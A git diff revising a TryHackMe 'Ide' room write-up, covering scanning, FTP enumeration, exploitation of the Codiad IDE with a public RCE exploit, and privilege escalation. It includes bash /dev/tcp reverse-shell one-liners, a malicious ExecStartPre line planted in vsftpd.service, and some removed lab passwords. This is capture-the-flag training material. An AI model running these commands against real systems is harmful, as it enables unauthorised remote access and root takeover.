@@ -1,13 +1,13 @@
 ## Ide 
 
-Room link: 
+Room link: https://tryhackme.com/room/ide
 
 # Scanning 
-I ran an aggressive nmap scan to begin. 
+I ran an aggressive nmap scan to begin. It looked like there are 3 services running on the system, FTP, SSH, and HTTP. 
 ```
-ajread@aj-ubuntu:~/TryHackMe$ nmap -A 10.10.88.255
+ajread@aj-ubuntu:~/TryHackMe$ nmap -A [Remote IP]
 Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-14 20:17 EDT
-Nmap scan report for 10.10.88.255
+Nmap scan report for [Remote IP]
 Host is up (0.094s latency).
 Not shown: 997 closed ports
 PORT   STATE SERVICE VERSION
@@ -39,11 +39,11 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 17.79 seconds
 ```
-A full nmap scan showed a random high port. 
+A full nmap scan showed a random high port as well. 
 ```
-ajread@aj-ubuntu:~/TryHackMe/thm_writeups_publish$ nmap -p- 10.10.252.87
+ajread@aj-ubuntu:~/TryHackMe/thm_writeups_publish$ nmap -p- [Remote IP]
 Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-30 18:46 EDT
-Nmap scan report for 10.10.252.87
+Nmap scan report for [Remote IP]
 Host is up (0.090s latency).
 Not shown: 65531 closed ports
 PORT      STATE SERVICE
@@ -56,7 +56,7 @@ Nmap done: 1 IP address (1 host up) scanned in 239.50 seconds
 ```
 
 # Enumeration 
-I first looked into the anonymous ftp login. There was a file called ```-``` nested within a directory or two. 
+I first looked into the anonymous ftp login. There was a file called ```-``` nested within a the ```...``` directory. 
 ```
 ftp> ls -la
 200 PORT command successful. Consider using PASV.
@@ -74,34 +74,35 @@ local: ./- remote: -
 226 Transfer complete.
 151 bytes received in 0.00 secs (1.1163 MB/s)
 ```
-The note itself said the following: 
+I pulled the ```-``` file from the FTP server and it appeared to be a note. The note itself said the following: 
 ```
 Hey john,
 I have reset the password as you have asked. Please use the default password to login. 
 Also, please take care of the image file ;)
 - drac.
 ```
+So, I can infer that there are two users named ```john``` and ```drac```. User ```john``` must have a simple password. Before looking back at the random open high port, I ran hydra against the FTP and SSH service with username ```john``` and a simple password list. I was unsuccessful so I knew the credentials must be used somewhere else on the system. 
 
 # Initial Access
-Based on the note, I navigated to the Codiad service running on port 62337 and logged in with credentials ```john:password```. Therefore, I knew that I had correct credentials for the service. I found a RCE on exploitdb: ```https://www.exploit-db.com/exploits/49705``` that requires authentication. The RCE appeared to 
+I checked out the random high port and found that it was a Codiad IDEA. I navigated to the Codiad service running on port 62337 and logged in with credentials ```john:[REDACTED]```. I found a RCE on exploitdb: ```https://www.exploit-db.com/exploits/49705``` that requires authentication. The RCE appears to be able to write to Codiad within ```components/filemanager/controller.php``` and execute system commands like ```nc``` or ```/bin/bash``` that can be used to call back to a remote machine.
 
 Before running the exploit, it required me to set up a VPS for the connection. So, in one terminal, I set up reverse shell in bash that would pipe to another listener on my machine from the remote connection. 
 ```
-echo 'bash -c "bash -i >/dev/tcp/10.8.1.236/10000 0>&1 2>&1"' | nc -lnvp 9999
+echo 'bash -c "bash -i >/dev/tcp/[Local IP]/10000 0>&1 2>&1"' | nc -lnvp 9999
 ```
-In another terminal I set up the listener on port 10000 to receive the reverse shell. 
+In another terminal on my local machine, I set up the listener on port 10000 to receive the final reverse shell from the remote machine. 
 ```
 ajread@aj-ubuntu:~/TryHackMe$ nc -lnvp 10000
 ```
-After everything was set up, I ran the exploit.
+After everything was set up, I ran the exploit and pointed it as the Codiad IDE with the ```john:[REDACTED]``` credentials.
 ```
-ajread@aj-ubuntu:~/TryHackMe/practice$ python3 49705.py http://10.10.252.87:62337/ john password 10.8.1.236 9999 linux
+ajread@aj-ubuntu:~/TryHackMe/practice$ python3 49705.py http://[Remote IP]:62337/ john [REDACTED] [Local IP] 9999 linux
 ```
 And, I received a shell! 
 ```
 ajread@aj-ubuntu:~/TryHackMe$ nc -lnvp 10000
 Listening on 0.0.0.0 10000
-Connection received on 10.10.252.87 57402
+Connection received on [Remote IP] 57402
 bash: cannot set terminal process group (939): Inappropriate ioctl for device
 bash: no job control in this shell
 www-data@ide:/var/www/html/codiad/components/filemanager$ id
@@ -118,9 +119,9 @@ After some looking around, I found credentials within user ```drac``` bash histo
 ```
 www-data@ide:/home/drac$ cat .bash_history
 cat .bash_history
-mysql -u drac -p 'Th3dRaCULa1sR3aL'
+mysql -u drac -p [REDACTED]
 ```
-I used ssh to log in with the credentials and found the flag! 
+I used ssh to log in with the credentials above and found the flag! 
 ```
 drac@ide:~$ id
 uid=1000(drac) gid=1000(drac) groups=1000(drac),24(cdrom),27(sudo),30(dip),46(plugdev)
@@ -139,7 +140,7 @@ Matching Defaults entries for drac on ide:
 User drac may run the following commands on ide:
     (ALL : ALL) /usr/sbin/service vsftpd restart
 ```
-I looked at the ```vsftpd.service``` file and noticed that I had write permissions. Since ```ExecStartPre``` contains additional commands that are run after ```ExecStart```, I added another ```ExecStartPre``` field to execute a reverse shell using bash. (This page was a great resource: ```https://www.freedesktop.org/software/systemd/man/systemd.service.html```.)
+I looked at the ```vsftpd.service``` file and noticed that I had write permissions. Since ```ExecStartPre``` contains additional commands that are run after ```ExecStart```, I added another ```ExecStartPre``` field to execute a reverse shell using bash after the original ```ExecStartPre```. (This page was a great resource: ```https://www.freedesktop.org/software/systemd/man/systemd.service.html``` if interested). 
 ```
 drac@ide:/lib/systemd/system$ cat vsftpd.service 
 [Unit]
@@ -151,12 +152,12 @@ Type=simple
 ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
 ExecReload=/bin/kill -HUP $MAINPID
 ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty
-ExecStartPre=-/bin/bash -c "bash -i >& /dev/tcp/10.8.1.236/8888 0>&1"
+ExecStartPre=-/bin/bash -c "bash -i >& /dev/tcp/[Local IP]/8888 0>&1"
 
 [Install]
 WantedBy=multi-user.target
 ```
-I started a listener on my local machine to catch the elevated reverse shell based on the information in ```ExecStartPre```.
+I started a listener on my local machine to catch the elevated reverse shell on port 8888 above.
 ```
 ajread@aj-ubuntu:~/TryHackMe$ nc -lnvp 8888
 ```
@@ -177,7 +178,7 @@ And it called back to my local machine with an elevated shell!
 ```
 ajread@aj-ubuntu:~/TryHackMe$ nc -lnvp 8888
 Listening on 0.0.0.0 8888
-Connection received on 10.10.27.26 35294
+Connection received on [Remote IP] 35294
 bash: cannot set terminal process group (1683): Inappropriate ioctl for device
 bash: no job control in this shell
 root@ide:/# id
